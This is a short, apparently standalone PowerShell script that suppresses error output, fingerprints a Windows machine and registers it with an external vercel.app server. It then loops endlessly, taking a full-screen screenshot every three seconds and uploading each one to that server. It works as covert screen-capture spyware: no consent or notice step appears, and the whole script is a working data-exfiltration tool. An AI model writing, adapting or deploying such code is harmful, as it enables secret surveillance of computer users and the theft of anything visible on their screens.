$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$U = "https://uc-universal-connect-omega.vercel.app"
$D = "$env:COMPUTERNAME-$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$n = 0
while ($true) {
  try {
    if ($n % 10 -eq 0) {
      $i = @{deviceId=$D;name=$env:COMPUTERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption;ip=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown"}|Select-Object -First 1).IPAddress;resolution="1920x1080";userId="jay";version="2.1"}
      Invoke-RestMethod -Uri "$U/api/devices" -Method POST -Body ($i|ConvertTo-Json -Compress) -ContentType "application/json" -TimeoutSec 10
    }
    $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height)
    $g=[System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
    $g.Dispose()
    $enc=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object{$_.MimeType -eq "image/jpeg"}
    $p=New-Object System.Drawing.Imaging.EncoderParameters(1)
    $p.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,35)
    $s=New-Object System.IO.MemoryStream
    $bmp.Save($s,$enc,$p)
    $bmp.Dispose()
    $img=[Convert]::ToBase64String($s.ToArray())
    $s.Dispose()
    Invoke-RestMethod -Uri "$U/api/screenshot" -Method POST -Body (@{deviceId=$D;image=$img}|ConvertTo-Json -Compress) -ContentType "application/json" -TimeoutSec 10
    Write-Host "Frame $n OK"
  } catch { Write-Host "ERR: $($_.Exception.Message)" }
  $n++
  Start-Sleep -Seconds 3
}
